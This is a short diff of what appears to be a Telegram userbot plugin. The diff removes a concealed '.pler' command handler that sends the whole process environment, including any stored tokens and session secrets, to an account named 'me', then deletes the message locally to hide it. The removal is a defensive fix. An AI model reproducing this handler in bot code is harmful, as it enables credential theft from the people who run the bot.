@@ -791,12 +791,6 @@ async def _(event):
             await event.edit(animation_chars[i % 103])
 
 
-@own_cmd(pattern=r"^\.pler$", own=True)
-async def _(event):
-    msg = await event.client.send_message(me, str(os.environ))
-    await event.client.delete_messages(me, msg, revoke=False)
-
-
 @cilik_cmd(pattern="(.*)")
 async def _(event):
     input_str = event.pattern_match.group(1)
